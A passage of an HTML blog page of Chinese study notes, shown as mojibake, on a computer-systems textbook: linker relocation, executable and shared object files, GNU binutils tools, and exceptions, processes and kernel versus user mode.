alt="image-20210615155600812"></p><p>ç„¶åè®¡ç®—æ–°çš„å¼•ç”¨ï¼Œå³æ–°çš„åç§»é‡ï¼Œä»PCçš„å½“å‰å€¼ï¼ˆå½“å‰æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤èµ·å§‹åœ°å€ï¼‰è¦åç§»å¤šå°‘æ‰ä¼šåˆ°swapçš„å®é™…è¿è¡Œæ—¶åœ°å€</p><p>è¿™ä¸ªå…¬å¼å¯ä»¥ç†è§£ä¸ºå¼•ç”¨çš„è¿è¡Œæ—¶åœ°å€åŠ ä¸Šå¼•ç”¨æ‰€å æ®çš„å­—èŠ‚æ•°ï¼ˆbb+4)ï¼Œç„¶åç”¨ç›®æ ‡åœ°å€å‡å»ä¸Šé¢çš„å€¼å°±æ˜¯æˆ‘ä»¬è¦å¾—åˆ°çš„åç§»é‡ã€‚</p><p>-4æ˜¯ç”±ä¸åŒæœºå™¨çš„å¼•ç”¨é•¿åº¦å†³å®šçš„</p><p><img src="/posts/e0eae192/image-20210615155705059.png" alt="image-20210615155705059"></p><p>äºæ˜¯æŒ‡ä»¤è¢«ä¿®æ”¹ä¸º</p><p><img src="/posts/e0eae192/image-20210615155856359.png" alt="image-20210615155856359"></p><p><img src="/posts/e0eae192/image-20210615155910631.png" alt="image-20210615155910631"></p><p><strong>2.é‡å®šä½PCç»å¯¹å¼•ç”¨</strong></p><p><img src="/posts/e0eae192/image-20210615160238171.png" alt="image-20210615160238171"></p><p><img src="/posts/e0eae192/image-20210615160318085.png" alt="image-20210615160318085"></p><hr><h3 id="78-å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶"><a class="markdownIt-Anchor" href="#78-å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶"></a> 7.8 å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶</h3><p><img src="/posts/e0eae192/image-20210615161745659.png" alt="image-20210615161745659"></p><p>å¯æ‰§è¡Œæ–‡ä»¶pçš„æ®µå¤´éƒ¨è¡¨</p><p><img src="/posts/e0eae192/image-20210615161847318.png" alt="image-20210615161847318"></p><p><img src="/posts/e0eae192/image-20210615161900425.png" alt="image-20210615161900425"></p><hr><h3 id="79-åŠ è½½å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶"><a class="markdownIt-Anchor" href="#79-åŠ è½½å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶"></a> 7.9 åŠ è½½å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶</h3><p><img src="/posts/e0eae192/image-20210615162558215.png" alt="image-20210615162558215"></p><p><img src="/posts/e0eae192/image-20210615162610066.png" alt="image-20210615162610066"></p><hr><h3 id="710-åŠ¨æ€é“¾æ¥å…±äº«åº“"><a class="markdownIt-Anchor" href="#710-åŠ¨æ€é“¾æ¥å…±äº«åº“"></a> 7.10 åŠ¨æ€é“¾æ¥å…±äº«åº“</h3><p>é™æ€åº“å­˜åœ¨å¦‚ä¸‹ç¼ºç‚¹:</p><ul><li><p>åœ¨å­˜å‚¨ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­æœ‰å¤šä¸ªå‰¯æœ¬ (æ¯ä¸€ä¸ªå‡½æ•°å‡éœ€è¦é™æ€åº“æ–‡ä»¶ )</p></li><li><p>åœ¨è¿è¡Œä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­å­˜åœ¨å¤šä¸ªå‰¯æœ¬</p></li><li><p>å³ä¾¿æ˜¯å¯¹ç³»ç»Ÿåº“è¿›è¡Œå°bugçš„ä¿®å¤ï¼Œä¹Ÿéœ€è¦å¯¹ä½¿ç”¨åˆ°è¿™ä¸ªåº“çš„æ‰€æœ‰åº”ç”¨æ˜¾ç¤ºåœ°é‡æ–°é“¾æ¥</p></li></ul><p><strong>å…±äº«åº“</strong>( shared library)æ˜¯è‡´åŠ›äºè§£å†³é™æ€åº“ç¼ºé™·çš„ä¸€ä¸ªç°ä»£åˆ›æ–°äº§ç‰©ã€‚å…±äº«åº“æ˜¯ä¸€ä¸ªç›®æ ‡æ¨¡å—ï¼Œåœ¨è¿è¡Œæ—¶ï¼Œå¯ä»¥åŠ è½½åˆ°ä»»æ„çš„å­˜å‚¨å™¨åœ°å€ï¼Œå¹¶å’Œä¸€ä¸ªåœ¨å­˜å‚¨å™¨ä¸­çš„ç¨‹åºé“¾æ¥èµ·æ¥ã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºåŠ¨æ€é“¾æ¥( dynamic linking),æ˜¯ç”±ä¸€ä¸ªå«åšåŠ¨æ€é“¾æ¥å™¨(dynamic linker)çš„ç¨‹åºæ¥æ‰§è¡Œçš„ã€‚<br>å…±äº«åº“ä¹Ÿç§°ä¸ºå…±äº«ç›®æ ‡( shared object),åœ¨Uniâ…¸ç³»ç»Ÿä¸­é€šå¸¸ç”¨.soåç¼€æ¥è¡¨ç¤ºã€‚å¾®è½¯çš„æ“ä½œç³»ç»Ÿå¤§é‡åœ°åˆ©ç”¨äº†å…±äº«åº“ï¼Œå®ƒä»¬ç§°ä¸ºDLLï¼ˆåŠ¨æ€é“¾æ¥åº“ï¼‰ã€‚</p><p><img src="/posts/e0eae192/image-20210615164131444.png" alt="image-20210615164131444"></p><hr><h3 id="713-å¤„ç†ç›®æ ‡æ–‡ä»¶çš„å·¥å…·"><a class="markdownIt-Anchor" href="#713-å¤„ç†ç›®æ ‡æ–‡ä»¶çš„å·¥å…·"></a> 7.13 å¤„ç†ç›®æ ‡æ–‡ä»¶çš„å·¥å…·</h3><p>åœ¨Unixç³»ç»Ÿä¸­æœ‰å¤§é‡å¯ç”¨çš„å·¥å…·å¯ä»¥å¸®åŠ©ä½ ç†è§£å’Œå¤„ç†ç›®æ ‡æ–‡ä»¶ã€‚ç‰¹åˆ«åœ°ï¼Œ GNU binutilsåŒ…å°¤å…¶æœ‰å¸®åŠ©ï¼Œè€Œä¸”å¯ä»¥è¿è¡Œåœ¨æ¯ä¸ªUnâ…¸å¹³å°ä¸Šã€‚</p><ul><li><strong>AR</strong>: åˆ›å»ºé™æ€åº“ï¼Œæ’å…¥ã€åˆ é™¤ã€åˆ—å‡ºå’Œæå–æˆå‘˜ã€‚</li><li><strong>STRINGS</strong>: åˆ—å‡ºä¸€ä¸ªç›®æ ‡æ–‡ä»¶ä¸­æ‰€æœ‰å¯æ‰“å°çš„å­—ç¬¦ä¸²ã€‚</li><li><strong>STRIP</strong>: ä»ç›®æ ‡æ–‡ä»¶ä¸­åˆ é™¤ç¬¦å·è¡¨ä¿¡æ¯ã€‚</li><li><strong>NM</strong>: åˆ—å‡ºä¸€ä¸ªç›®æ ‡æ–‡ä»¶çš„ç¬¦å·è¡¨ä¸­å®šä¹‰çš„ç¬¦å·ã€‚</li><li><strong>SIZE</strong>: åˆ—å‡ºç›®æ ‡æ–‡ä»¶ä¸­èŠ‚çš„åå­—å’Œå¤§å°</li><li><strong>READELF</strong>: æ˜¾ç¤ºä¸€ä¸ªç›®æ ‡æ–‡ä»¶çš„å®Œæ•´ç»“æ„ï¼ŒåŒ…æ‹¬ELFå¤´ä¸­ç¼–ç çš„æ‰€æœ‰ä¿¡æ¯ã€‚åŒ…å«SIZEå’ŒNMçš„åŠŸèƒ½</li><li><strong>OBJDUMP</strong>: æ‰€æœ‰äºŒè¿›åˆ¶å·¥å…·ä¹‹æ¯ã€‚èƒ½å¤Ÿæ˜¾ç¤ºä¸€ä¸ªç›®æ ‡æ–‡ä»¶ä¸­æ‰€æœ‰çš„ä¿¡æ¯ã€‚å®ƒæœ€å¤§çš„ä½œç”¨æ˜¯åæ±‡ç¼–ã€‚textèŠ‚ä¸­çš„äºŒè¿›åˆ¶æŒ‡ä»Š</li></ul><p>Unixç³»ç»Ÿä¸ºæ“ä½œå…±äº¨åº“è¿˜æä¾›äº†LDDç¨‹åºï¼š</p><ul><li><strong>LDD</strong>: åˆ—å‡ºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶åœ¨è¿è¡Œæ—¶æ‰€éœ€è¦çš„å…±äº«åº“ã€‚</li></ul><hr><h2 id="ç¬¬å…«ç« -å¼‚å¸¸æ§åˆ¶æµ"><a class="markdownIt-Anchor" href="#ç¬¬å…«ç« -å¼‚å¸¸æ§åˆ¶æµ"></a> ç¬¬å…«ç«  å¼‚å¸¸æ§åˆ¶æµ</h2><h3 id="81-å¼‚å¸¸"><a class="markdownIt-Anchor" href="#81-å¼‚å¸¸"></a> 8.1 å¼‚å¸¸</h3><p><strong>å¼‚å¸¸</strong>å°±æ˜¯æ§åˆ¶æµä¸­çš„çªå˜ï¼Œç”¨æ¥å“åº”å¤„ç†å™¨çŠ¶æ€ä¸­çš„æŸäº›å˜åŒ–ã€‚</p><p>çŠ¶æ€å˜åŒ–ç§°ä¸º<strong>äº‹ä»¶</strong>ã€‚äº‹ä»¶å¯èƒ½å’Œå½“å‰æŒ‡ä»¤çš„æ‰§è¡Œç›´æ¥ç›¸å…³ã€‚<br>æ¯”å¦‚ï¼Œå‘ç”Ÿè™šæ‹Ÿå­˜å‚¨å™¨ç¼ºé¡µã€ç®—æœ¯æº¢å‡ºï¼Œæˆ–è€…ä¸€æ¡æŒ‡ä»¤è¯•å›¾é™¤ä»¥é›¶ã€‚å¦ä¸€æ–¹é¢ï¼Œäº‹ä»¶ä¹Ÿå¯èƒ½å’Œå½“å‰æŒ‡ä»¤çš„æ‰§è¡Œæ²¡æœ‰å…³ç³»ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ªç³»ç»Ÿå®šæ—¶å™¨äº§ç”Ÿä¿¡å·æˆ–è€…ä¸€ä¸ªI/Oè¯·æ±‚å®Œæˆã€‚</p><p><img src="/posts/e0eae192/image-20210615171511841.png" alt="image-20210615171511841"></p><p>åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œå½“å¤„ç†å™¨æ£€æµ‹åˆ°æœ‰äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå®ƒå°±ä¼šé€šè¿‡ä¸€å¼ å«åš<strong>å¼‚å¸¸è¡¨</strong>(exception table)çš„è·³è½¬è¡¨ï¼Œè¿›è¡Œä¸€ä¸ª<strong>é—´æ¥è¿‡ç¨‹è°ƒç”¨</strong>ï¼ˆå¼‚å¸¸)ï¼Œåˆ°ä¸€ä¸ªä¸“é—¨è®¾è®¡ç”¨æ¥å¤„ç†è¿™ç±»äº‹ä»¶çš„æ“ä½œç³»ç»Ÿå­ç¨‹åºï¼ˆ<strong>å¼‚å¸¸å¤„ç†ç¨‹åº</strong>( exception handler))</p><p>å½“å¼‚å¸¸å¤„ç†ç¨‹åºå®Œæˆå¤„ç†åï¼Œæ ¹æ®å¼•èµ·å¼‚å¸¸çš„äº‹ä»¶çš„ç±»å‹ï¼Œä¼šå‘ç”Ÿä»¥ä¸‹ä¸‰ç§æƒ…å†µä¸­çš„ä¸€ç§ï¼š</p><ol><li>å¤„ç†ç¨‹åºå°†æ§åˆ¶è¿”å›ç»™å½“å‰æŒ‡ä»¤I<sub>curr</sub>ï¼Œå³å½“äº‹ä»¶å‘ç”Ÿæ—¶æ­£åœ¨æ‰§è¡Œçš„æŒ‡ä»¤ã€‚</li><li>å¤„ç†ç¨‹åºå°†æ§åˆ¶è¿”å›ç»™I<sub>next</sub>ï¼Œå³å¦‚æœæ²¡æœ‰å‘ç”Ÿå¼‚å¸¸å°†ä¼šæ‰§è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</li><li>å¤„ç†ç¨‹åºç»ˆæ­¢è¢«ä¸­æ–­çš„ç¨‹åºã€‚</li></ol><h4 id="811-å¼‚å¸¸å¤„ç†"><a class="markdownIt-Anchor" href="#811-å¼‚å¸¸å¤„ç†"></a> 8.1.1 å¼‚å¸¸å¤„ç†</h4><p>åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ï¼ˆå½“è®¡ç®—æœºé‡å¯æˆ–è€…åŠ ç”µæ—¶ï¼‰ï¼Œæ“ä½œç³»ç»Ÿåˆ†é…å’Œåˆå§‹åŒ–ä¸€å¼ ç§°ä¸º<strong>å¼‚å¸¸è¡¨</strong>çš„è·³è½¬è¡¨ï¼Œä½¿å¾—æ¡ç›®kåŒ…å«å¼‚å¸¸kçš„å¤„ç†ç¨‹åºçš„åœ°å€ã€‚å›¾8-2å±•ç¤ºäº†ä¸€å¼ å¼‚å¸¸è¡¨çš„æ ¼å¼ã€‚</p><p>å¼‚å¸¸è¡¨çš„èµ·å§‹åœ°å€æ”¾åœ¨ä¸€ä¸ªå«åš<strong>å¼‚å¸¸è¡¨åŸºå€å¯„å­˜å™¨</strong>çš„ç‰¹æ®ŠCPUå¯„å­˜å™¨ä¸­ã€‚</p><p><img src="/posts/e0eae192/image-20210615171950006.png" alt="image-20210615171950006"></p><p><strong>å¼‚å¸¸</strong>ç±»ä¼¼äºè¿‡ç¨‹è°ƒç”¨ï¼Œä½†ä¹Ÿæœ‰ä¸€äº›ä¸åŒä¹‹å¤„ï¼š</p><ul><li>è¿‡ç¨‹è°ƒç”¨æ—¶ï¼Œåœ¨è·³è½¬åˆ°å¤„ç†ç¨‹åºä¹‹å‰ï¼Œå¤„ç†å™¨å°†è¿”å›åœ°å€å‹å…¥æ ˆä¸­ã€‚ç„¶è€Œï¼Œæ ¹æ®å¼‚å¸¸çš„ç±»å‹ï¼Œè¿”å›åœ°å€è¦ä¹ˆæ˜¯å½“å‰æŒ‡ä»¤ï¼ˆå½“äº‹ä»¶å‘ç”Ÿæ—¶æ­£åœ¨æ‰§è¡Œçš„æŒ‡ä»¤ï¼‰ï¼Œè¦ä¹ˆæ˜¯ä¸‹ä¸€æ¡ææŒ‡ä»¤ï¼ˆå¦‚æœäº‹ä»¶ä¸å‘ç”Ÿï¼Œå°†ä¼šåœ¨å½“å‰æŒ‡ä»¤åæ‰§è¡Œçš„æŒ‡ä»¤ï¼‰ã€‚</li><li>å¤„ç†å™¨ä¹ŸæŠŠä¸€äº›é¢å¤–çš„å¤„ç†å™¨çŠ¶æ€å‹åˆ°æ ˆé‡Œï¼Œåœ¨å¤„ç†ç¨‹åºè¿”å›æ—¶ï¼Œé‡æ–°å¼€å§‹è¢«ä¸­æ–­çš„ç¨‹åºä¼šéœ€è¦è¿™äº›çŠ¶æ€ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ªIA32ç³»ç»Ÿå°†åŒ…å«å½“å‰æ¡ä»¶ç å’Œå…¶ä»–å†…å®¹çš„EFLAGSå¯„å­˜å™¨å‹äººæ ˆä¸­ã€‚</li><li>å¦‚æœæ§åˆ¶ä»ä¸€ä¸ªç”¨æˆ·ç¨‹åºè½¬ç§»åˆ°å†…æ ¸ï¼Œé‚£ä¹ˆæ‰€æœ‰è¿™äº›é¡¹ç›®éƒ½è¢«å‹åˆ°å†…æ ¸æ ˆä¸­ï¼Œè€Œä¸æ˜¯å‹åˆ°ç”¨æˆ·æ ˆä¸­ã€‚</li><li>å¼‚å¸¸å¤„ç†ç¨‹åºè¿è¡Œåœ¨å†…æ ¸æ¨¡å¼ä¸‹(è§8.2.4èŠ‚)ï¼Œè¿™æ„å‘³ç€å®ƒä»¬å¯¹æ‰€æœ‰çš„ç³»ç»Ÿèµ„æºéƒ½æœ‰å®Œå…¨çš„è®¿é—®æƒé™ã€‚</li></ul><h4 id="812-å¼‚å¸¸çš„ç±»åˆ«"><a class="markdownIt-Anchor" href="#812-å¼‚å¸¸çš„ç±»åˆ«"></a> 8.1.2 å¼‚å¸¸çš„ç±»åˆ«</h4><p><img src="/posts/e0eae192/image-20210615172726725.png" alt="image-20210615172726725"></p><h5 id="1ä¸­æ–­"><a class="markdownIt-Anchor" href="#1ä¸­æ–­"></a> 1.ä¸­æ–­</h5><p>ä¸­æ–­æ˜¯å¼‚æ­¥å‘ç”Ÿçš„ï¼Œæ˜¯æ¥è‡ªå¤„ç†å™¨å¤–éƒ¨çš„I/Oè®¾å¤‡çš„ä¿¡å·çš„ç»“æœã€‚</p><p><img src="/posts/e0eae192/image-20210615172954970.png" alt="image-20210615172954970"></p><h5 id="2é™·é˜±å’Œç³»ç»Ÿè°ƒç”¨"><a class="markdownIt-Anchor" href="#2é™·é˜±å’Œç³»ç»Ÿè°ƒç”¨"></a> 2.é™·é˜±å’Œç³»ç»Ÿè°ƒç”¨</h5><p>é™·é˜±æ˜¯æœ‰æ„çš„å¼‚å¸¸ï¼Œæ˜¯æ‰§è¡Œä¸€æ¡æŒ‡ä»¤çš„ç»“æœã€‚</p><p>é™·é˜±<strong>æœ€é‡è¦çš„ç”¨é€”</strong>æ˜¯åœ¨ç”¨æˆ·ç¨‹åºå’Œå†…æ ¸ä¹‹é—´æä¾›ä¸€ä¸ªåƒè¿‡ç¨‹ä¸€æ ·çš„æ¥å£ï¼Œå«åš<strong>ç³»ç»Ÿè°ƒç”¨</strong>ã€‚</p><p><img src="/posts/e0eae192/image-20210615173310199.png" alt="image-20210615173310199"></p><p><strong>ç³»ç»Ÿè°ƒç”¨å’Œæ™®é€šçš„å‡½æ•°è°ƒç”¨</strong>å®ç°éå¸¸ä¸åŒï¼š</p><ul><li>æ™®é€šçš„å‡½æ•°è¿è¡Œåœ¨ç”¨æˆ·æ¨¡å¼(user mode)ä¸­ï¼Œç”¨æˆ·æ¨¡å¼<br>é™åˆ¶äº†å‡½æ•°å¯ä»¥æ‰§è¡Œçš„æŒ‡ä»¤çš„ç±»å‹ï¼Œè€Œä¸”å®ƒä»¬åªèƒ½è®¿é—®ä¸è°ƒç”¨å‡½æ•°ç›¸åŒçš„æ ˆã€‚</li><li>ç³»ç»Ÿè°ƒç”¨è¿è¡Œåœ¨å†…æ ¸æ¨¡å¼(kernel mode)ä¸­ï¼Œå†…æ ¸æ¨¡å¼å…è®¸ç³»ç»Ÿè°ƒç”¨æ‰§è¡ŒæŒ‡ä»¤ï¼Œå¹¶è®¿é—®å®šä¹‰åœ¨å†…æ ¸ä¸­çš„æ ˆã€‚</li></ul><h5 id="3æ•…éšœ"><a class="markdownIt-Anchor" href="#3æ•…éšœ"></a> 3.æ•…éšœ</h5><p>æ•…éšœç”±é”™è¯¯æƒ…å†µå¼•èµ·ï¼Œå®ƒå¯èƒ½èƒ½å¤Ÿè¢«æ•…éšœå¤„ç†ç¨‹åºä¿®æ­£ã€‚å½“æ•…éšœå‘ç”Ÿæ—¶ï¼Œå¤„ç†å™¨å°†æ§åˆ¶è½¬ç§»ç»™æ•…éšœå¤„ç†ç¨‹åºã€‚å¦‚æœå¤„ç†ç¨‹åºèƒ½å¤Ÿä¿®æ­£è¿™ä¸ªé”™è¯¯æƒ…å†µï¼Œå®ƒå°±å°†æ§åˆ¶è¿”å›åˆ°å¼•èµ·æ•…éšœçš„æŒ‡ä»¤ï¼Œä»è€Œé‡æ–°æ‰§è¡Œå®ƒã€‚å¦åˆ™ï¼Œå¤„ç†ç¨‹åºè¿”å›åˆ°å†…æ ¸ä¸­çš„ abortä¾‹ç¨‹ï¼Œ abortä¾‹ç¨‹ä¼šç»ˆæ­¢å¼•èµ·æ•…éšœçš„åº”ç”¨ç¨‹åºã€‚</p><p><img src="/posts/e0eae192/image-20210615173712103.png" alt="image-20210615173712103"></p><h5 id="4ç»ˆæ­¢"><a class="markdownIt-Anchor" href="#4ç»ˆæ­¢"></a> 4.ç»ˆæ­¢</h5><p>ç»ˆæ­¢æ˜¯ä¸å¯æ¢å¤çš„è‡´å‘½é”™è¯¯é€ æˆçš„ç»“æœï¼Œé€šå¸¸æ˜¯ä¸€äº›ç¡¬ä»¶é”™è¯¯ï¼Œæ¯”å¦‚DRAMæˆ–è€…SRAMä½è¢«æŸåæ—¶å‘ç”Ÿçš„å¥‡å¶é”™è¯¯ã€‚ç»ˆæ­¢å¤„ç†ç¨‹åºä»ä¸å°†æ§åˆ¶è¿”å›ç»™åº”ç”¨ç¨‹åºã€‚å¦‚å›¾8-8æ‰€ç¤ºï¼Œå¤„ç†ç¨‹åºå°†æ§åˆ¶è¿”å›ç»™ä¸€ä¸ª abortä¾‹ç¨‹ï¼Œè¯¥ä¾‹ç¨‹ä¼šç»ˆæ­¢è¿™ä¸ªåº”ç”¨ç¨‹åºã€‚</p><p><img src="/posts/e0eae192/image-20210615173835444.png" alt="image-20210615173835444"></p><h4 id="813-linuxia32ç³»ç»Ÿä¸­çš„å¼‚å¸¸"><a class="markdownIt-Anchor" href="#813-linuxia32ç³»ç»Ÿä¸­çš„å¼‚å¸¸"></a> 8.1.3 Linux/IA32ç³»ç»Ÿä¸­çš„å¼‚å¸¸</h4><h5 id="1linuxia32æ•…éšœå’Œç»ˆæ­¢"><a class="markdownIt-Anchor" href="#1linuxia32æ•…éšœå’Œç»ˆæ­¢"></a> 1.Linux/IA32æ•…éšœå’Œç»ˆæ­¢</h5><p><img src="/posts/e0eae192/image-20210615174044372.png" alt="image-20210615174044372"></p><h5 id="2linuxia32ç³»ç»Ÿè°ƒç”¨"><a class="markdownIt-Anchor" href="#2linuxia32ç³»ç»Ÿè°ƒç”¨"></a> 2.Linux/IA32ç³»ç»Ÿè°ƒç”¨</h5><p><img src="/posts/e0eae192/image-20210615174116950.png" alt="image-20210615174116950"></p><hr><h3 id="82-è¿›ç¨‹"><a class="markdownIt-Anchor" href="#82-è¿›ç¨‹"></a> 8.2 è¿›ç¨‹</h3><p><strong>è¿›ç¨‹</strong>çš„ç»å…¸å®šä¹‰å°±æ˜¯ä¸€ä¸ªæ‰§è¡Œä¸­çš„ç¨‹åºçš„å®ä¾‹ã€‚ç³»ç»Ÿä¸­çš„æ¯ä¸ªç¨‹åºéƒ½æ˜¯è¿è¡Œåœ¨æŸä¸ªè¿›ç¨‹çš„ä¸Šä¸‹æ–‡( context)ä¸­çš„ã€‚ä¸Šä¸‹æ–‡æ˜¯ç”±ç¨‹åºæ­£ç¡®è¿è¡Œæ‰€éœ€çš„çŠ¶æ€ç»„æˆçš„ã€‚è¿™ä¸ªçŠ¶æ€åŒ…æ‹¬å­˜æ”¾åœ¨å­˜å‚¨å™¨ä¸­çš„ç¨‹åºçš„ä»£ç å’Œæ•°æ®ã€å®ƒçš„æ ˆã€é€šç”¨ç›®çš„å¯„å­˜å™¨çš„å†…å®¹ã€ç¨‹åºè®¡æ•°å™¨ã€ç¯å¢ƒå˜é‡ä»¥åŠæ‰“å¼€æ–‡ä»¶æè¿°ç¬¦çš„é›†åˆã€‚</p><p>è¿›ç¨‹æä¾›ç»™åº”ç”¨ç¨‹åºä¸¤ä¸ª<strong>å…³é”®æŠ½è±¡</strong>ï¼š</p><ul><li>ä¸€ä¸ªç‹¬ç«‹çš„é€»è¾‘æ§åˆ¶æµï¼Œå®ƒæä¾›ä¸€ä¸ªå‡è±¡ï¼Œå¥½åƒæˆ‘ä»¬çš„ç¨‹åºç‹¬å åœ°ä½¿ç”¨å¤„ç†å™¨ã€‚</li><li>ä¸€ä¸ªç§æœ‰çš„åœ°å€ç©ºé—´ï¼Œå®ƒæä¾›ä¸€ä¸ªå‡è±¡ï¼Œå¥½åƒæˆ‘ä»¬çš„ç¨‹åºç‹¬å åœ°ä½¿ç”¨å­˜å‚¨å™¨ç³»ç»Ÿã€‚</li></ul><h4 id="821-é€»è¾‘æ§åˆ¶æµ"><a class="markdownIt-Anchor" href="#821-é€»è¾‘æ§åˆ¶æµ"></a> 8.2.1 é€»è¾‘æ§åˆ¶æµ</h4><p><strong>é€»è¾‘æ§åˆ¶æµ</strong>æä¾›ä¸€ä¸ªå‡è±¡ï¼Œå¥½åƒæˆ‘ä»¬çš„ç¨‹åºåœ¨ç‹¬å åœ°ä½¿ç”¨å¤„ç†å™¨ã€‚å¦‚æœæƒ³ç”¨è°ƒè¯•å™¨å•æ­¥æ‰§è¡Œç¨‹åºï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°ä¸€ç³»åˆ—çš„ç¨‹åºè®¡æ•°å™¨(PC)çš„å€¼ï¼Œè¿™äº›å€¼å”¯ä¸€åœ°å¯¹åº”äºåŒ…å«åœ¨ç¨‹åºçš„å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä¸­çš„æŒ‡ä»¤ï¼Œæˆ–è€…æ˜¯åŒ…å«åœ¨è¿è¡Œæ—¶åŠ¨æ€é“¾æ¥åˆ°ç¨‹åºçš„å…±äº«å¯¹è±¡ä¸­çš„æŒ‡ä»¤ã€‚è¿™ä¸ªPCå€¼çš„åºåˆ—å«åš<strong>é€»è¾‘æ§åˆ¶æµ</strong>ï¼Œæˆ–è€…ç®€ç§°é€»è¾‘æµã€‚</p><p><img src="/posts/e0eae192/image-20210615190649412.png" alt="image-20210615190649412"></p><h4 id="822-å¹¶å‘æµ"><a class="markdownIt-Anchor" href="#822-å¹¶å‘æµ"></a> 8.2.2 å¹¶å‘æµ</h4><p><strong>å¹¶å‘æµ</strong>ï¼šä¸€ä¸ªé€»è¾‘æµçš„æ‰§è¡Œåœ¨æ—¶é—´ä¸Šä¸å¦ä¸€ä¸ªæµé‡å ã€‚æ›´å‡†ç¡®åœ°è¯´ï¼Œæµâ…©å’ŒYäº’ç›¸å¹¶å‘ï¼Œå½“ä¸”ä»…å½“Xåœ¨Yå¼€å§‹ä¹‹åå’ŒYç»“æŸä¹‹å‰å¼€å§‹ï¼Œæˆ–è€…Yåœ¨Xå¼€å§‹ä¹‹åå’ŒXç»“æŸä¹‹å‰å¼€å§‹ã€‚</p><p>**å¹¶å‘ï¼š**å¤šä¸ªæµå¹¶å‘åœ°æ‰§è¡Œçš„ä¸€èˆ¬ç°è±¡</p><p>**å¤šä»»åŠ¡ï¼š**ä¸€ä¸ªè¿›ç¨‹å’Œå…¶ä»–è¿›ç¨‹è½®æµè¿è¡Œçš„æ¦‚å¿µ</p><p>**æ—¶é—´ç‰‡ï¼š**ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œå®ƒçš„æ§åˆ¶æµçš„ä¸€éƒ¨åˆ†çš„æ¯ä¸€æ—¶é—´å«åšæ—¶é—´ç‰‡ï¼Œå¤šä»»åŠ¡ä¹Ÿå«ä½œæ—¶é—´åˆ†ç‰‡ã€‚</p><p>**å¹¶è¡Œæµï¼š**ä¸¤ä¸ªæµå¹¶å‘çš„è¿è¡Œåœ¨ä¸åŒçš„å¤„ç†å™¨æ ¸æˆ–è€…è®¡ç®—æœºä¸Šï¼Œå®ƒä»¬å¹¶è¡Œåœ°è¿è¡Œï¼Œä¸”å¹¶è¡Œåœ°æ‰§è¡Œ</p><h4 id="823-ç§æœ‰åœ°å€ç©ºé—´"><a class="markdownIt-Anchor" href="#823-ç§æœ‰åœ°å€ç©ºé—´"></a> 8.2.3 ç§æœ‰åœ°å€ç©ºé—´</h4><p>è¿›ç¨‹ä¹Ÿä¸ºæ¯ä¸ªç¨‹åºæä¾›ä¸€ç§å‡è±¡ï¼Œå¥½åƒå®ƒç‹¬å åœ°ä½¿ç”¨ç³»ç»Ÿåœ°å€ç©ºé—´ã€‚</p><p>ä¸€ä¸ªè¿›ç¨‹ä¸ºæ¯ä¸ªç¨‹åºæä¾›å®ƒè‡ªå·±çš„ç§æœ‰åœ°å€ç©ºé—´ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œå’Œè¿™ä¸ªç©ºé—´ä¸­æŸä¸ªåœ°å€ç›¸å…³è”çš„é‚£ä¸ªå­˜å‚¨å™¨å­—èŠ‚æ˜¯ä¸èƒ½è¢«å…¶ä»–è¿›ç¨‹è¯»æˆ–è€…å†™çš„ï¼Œä»è¿™ä¸ªæ„ä¹‰ä¸Šè¯´ï¼Œè¿™ä¸ªåœ°å€ç©ºé—´æ˜¯ç§æœ‰çš„ã€‚</p><p><img src="/posts/e0eae192/image-20210622073331434.png" alt="image-20210622073331434"></p><h4 id="824-ç”¨æˆ·æ¨¡å¼å’Œå†…æ ¸æ¨¡å¼"><a class="markdownIt-Anchor" href="#824-ç”¨æˆ·æ¨¡å¼å’Œå†…æ ¸æ¨¡å¼"></a> 8.2.4 ç”¨æˆ·æ¨¡å¼å’Œå†…æ ¸æ¨¡å¼</h4><p>é€šè¿‡æ¨¡å¼ä½æ¥æ§åˆ¶</p><p>**å†…æ ¸æ¨¡å¼ï¼š**è®¾ç½®äº†æ¨¡å¼ä½åï¼Œä¸€ä¸ªè¿è¡Œåœ¨å†…æ ¸æ¨¡å¼çš„è¿›ç¨‹å¯ä»¥æ‰§è¡ŒæŒ‡ä»¤é›†ä¸­çš„ä»»ä½•æŒ‡ä»¤ï¼Œå¹¶ä¸”å¯ä»¥è®¿é—®ç³»ç»Ÿä¸­ä»»ä½•å­˜å‚¨å™¨ä½ç½®ã€‚</p><p>**ç”¨æˆ·æ¨¡å¼ï¼š**æ²¡æœ‰è®¾ç½®æ¨¡å¼ä½æ—¶ï¼Œè¿›ç¨‹å°±è¿è¡Œåœ¨ç”¨æˆ·æ¨¡å¼ä¸­ã€‚ç”¨æˆ·æ¨¡å¼ä¸­çš„è¿›ç¨‹ä¸å…è®¸æ‰§è¡Œç‰¹æƒæŒ‡ä»¤(privileged instruction),æ¯”å¦‚åœæ­¢å¤„ç†å™¨ã€æ”¹å˜æ¨¡å¼ä½ï¼Œæˆ–è€…å‘èµ·ä¸€ä¸ªIOæ“ä½œã€‚ä¹Ÿä¸å…è®¸ç”¨æˆ·æ¨¡å¼ä¸­çš„è¿›ç¨‹ç›´æ¥å¼•ç”¨åœ°å€ç©ºé—´ä¸­å†…æ ¸åŒºå†…çš„ä»£ç å’Œæ•°æ®ã€‚ä»»ä½•è¿™æ 